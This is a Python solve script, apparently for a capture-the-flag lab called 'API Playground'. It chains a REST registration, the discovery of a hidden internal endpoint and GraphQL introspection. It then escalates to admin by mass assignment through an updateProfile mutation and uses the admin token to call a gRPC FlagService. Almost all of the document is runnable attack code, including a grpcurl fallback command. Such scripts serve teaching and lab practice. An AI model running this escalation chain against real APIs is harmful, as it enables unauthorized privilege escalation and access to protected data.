#!/usr/bin/env python3
"""
API Playground — Full Solve Script
Chain: REST → GraphQL → gRPC

Steps:
1. Register via REST API
2. Discover hidden /api/v1/internal/services endpoint
3. Use GraphQL introspection to find updateProfile mutation
4. Escalate role to admin via mass assignment vulnerability
5. Query GraphQL internalServices to get gRPC endpoint details
6. Get a fresh admin token (re-login after role change)
7. Call gRPC FlagService.GetFlag with admin token
"""
import sys
import requests
import json

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
GRPC_PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 50051

BASE = f"http://{HOST}:{PORT}"
USERNAME = "hacker_" + str(__import__("random").randint(1000, 9999))
PASSWORD = "password123"

print(f"[*] Target: {BASE}")
print(f"[*] gRPC port: {GRPC_PORT}")
print()

# Step 1: Register
print("[1] Registering user...")
r = requests.post(f"{BASE}/api/v1/auth/register", json={
    "username": USERNAME,
    "password": PASSWORD,
    "email": f"{USERNAME}@test.com",
})
data = r.json()
token = data["token"]
print(f"    User: {USERNAME}, Role: {data['role']}")
print(f"    Token: {token[:50]}...")
print()

headers = {"Authorization": f"Bearer {token}"}

# Step 2: Discover hidden endpoints
print("[2] Discovering hidden endpoints...")
r = requests.get(f"{BASE}/api/v1/internal/services", headers=headers)
if r.status_code == 200:
    services = r.json()
    print(f"    Found internal services:")
    for svc in services["services"]:
        print(f"      - {svc['name']}: {svc.get('endpoint', svc.get('host', ''))}:{svc.get('port', '')}")
else:
    print(f"    [!] Could not access internal services (status {r.status_code})")
print()

# Step 3: GraphQL introspection
print("[3] GraphQL introspection — finding mutations...")
introspection_query = {
    "query": """
    {
        __schema {
            mutationType {
                fields {
                    name
                    args { name type { name kind } }
                }
            }
        }
    }
    """
}
r = requests.post(f"{BASE}/graphql", json=introspection_query, headers=headers)
mutations = r.json()["data"]["__schema"]["mutationType"]["fields"]
for m in mutations:
    args = ", ".join([a["name"] for a in m["args"]])
    print(f"    Mutation: {m['name']}({args})")
print()

# Step 4: Privilege escalation via mass assignment
print("[4] Escalating role to admin via updateProfile mutation...")
escalation_query = {
    "query": """
    mutation {
        updateProfile(role: "admin") {
            success
            message
            user { username role }
        }
    }
    """
}
r = requests.post(f"{BASE}/graphql", json=escalation_query, headers=headers)
result = r.json()["data"]["updateProfile"]
print(f"    Success: {result['success']}")
print(f"    New role: {result['user']['role']}")
print()

# Step 5: Re-login to get admin token
print("[5] Re-login to get fresh admin token...")
r = requests.post(f"{BASE}/api/v1/auth/login", json={
    "username": USERNAME,
    "password": PASSWORD,
})
data = r.json()
admin_token = data["token"]
print(f"    Role: {data['role']}")
admin_headers = {"Authorization": f"Bearer {admin_token}"}
print()

# Step 6: Query internal services as admin
print("[6] Querying GraphQL internalServices as admin...")
services_query = {
    "query": """
    {
        internalServices {
            name
            protocol
            host
            port
            description
        }
    }
    """
}
r = requests.post(f"{BASE}/graphql", json=services_query, headers=admin_headers)
services = r.json()["data"]["internalServices"]
for svc in services:
    print(f"    {svc['name']} ({svc['protocol']}) @ {svc['host']}:{svc['port']}")
    print(f"      {svc['description']}")
print()

# Step 7: gRPC call to get the flag
print("[7] Calling gRPC FlagService.GetFlag with admin token...")
try:
    import grpc
    # Import or generate stubs
    try:
        from src.proto import flag_pb2, flag_pb2_grpc
    except ImportError:
        # Generate stubs on the fly
        import subprocess
        subprocess.run([
            "python", "-m", "grpc_tools.protoc",
            "-I", "src/proto",
            "--python_out=.", "--grpc_python_out=.",
            "src/proto/flag.proto"
        ], check=True)
        import flag_pb2, flag_pb2_grpc

    channel = grpc.insecure_channel(f"{HOST}:{GRPC_PORT}")
    stub = flag_pb2_grpc.FlagServiceStub(channel)

    # Send request with admin token
    response = stub.GetFlag(flag_pb2.FlagRequest(token=admin_token))
    print(f"    Message: {response.message}")
    print(f"    Flag: {response.flag}")
    print()
    if response.flag:
        print(f"[+] FLAG CAPTURED: {response.flag}")
    else:
        print("[-] No flag returned. Check token/role.")

except ImportError:
    print("    [!] grpcio not installed. Install with: pip install grpcio grpcio-tools")
    print(f"    [*] Manual: use grpcurl or grpc_cli to call FlagService.GetFlag")
    print(f"    [*] Command: grpcurl -plaintext -d '{{\"token\":\"{admin_token}\"}}' {HOST}:{GRPC_PORT} flagservice.FlagService/GetFlag")
except Exception as e:
    print(f"    [!] gRPC error: {e}")
    print(f"    [*] Try with grpcurl:")
    print(f"    grpcurl -plaintext -d '{{\"token\":\"{admin_token}\"}}' {HOST}:{GRPC_PORT} flagservice.FlagService/GetFlag")
